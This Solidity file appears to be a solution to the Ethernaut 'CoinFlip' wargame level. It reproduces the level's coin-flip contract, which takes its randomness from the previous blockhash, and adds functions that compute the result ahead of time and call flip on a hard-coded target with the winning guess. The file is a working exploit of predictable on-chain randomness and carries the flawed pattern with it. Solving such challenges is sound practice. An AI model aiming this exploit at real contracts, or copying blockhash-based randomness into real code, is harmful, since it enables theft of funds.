// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  address ethernautContract = 0xb7D0e195732ab970cD3E9aECB0eB6fA86bF49371;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }

  function calculateCoinFlip() public view returns(bool){
    uint256 blockValue = uint256(blockhash(block.number - 1));

    uint256 coinFlip = blockValue / FACTOR;
    return coinFlip == 1 ? true : false;
  }

  function alwaysRightFunction() public{
    bytes memory func= abi.encodeWithSignature("flip(bool)", calculateCoinFlip());
    (bool success ,) = ethernautContract.call(func);

    if(!success) revert("No success contacting the contract");
  }

}